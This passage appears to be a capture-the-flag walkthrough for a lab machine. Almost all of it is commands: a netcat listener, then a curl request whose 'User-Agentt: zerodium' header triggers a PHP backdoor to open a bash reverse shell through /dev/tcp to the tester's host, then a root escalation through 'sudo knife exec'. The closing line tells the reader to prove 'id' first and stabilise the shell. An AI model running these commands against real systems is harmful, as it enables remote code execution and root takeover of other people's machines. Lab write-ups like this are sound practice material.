# Receive the Bash callback after the identity proof succeeds.
nc -lvnp "$Lport"

curl --max-time 10 -fsS \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
  "http://$BoxIP:$WebPort/" >/dev/null

# Knife is a Ruby-capable sudo target; use the exact path shown by sudo -l.
sudo -l

knife --version

sudo /usr/bin/knife exec -E 'exec "/bin/bash"'

id

whoami
```

The header name has two `t` characters. Prove `id` before requesting a callback, stabilise the callback with the Linux shell page, and keep the root proof private.
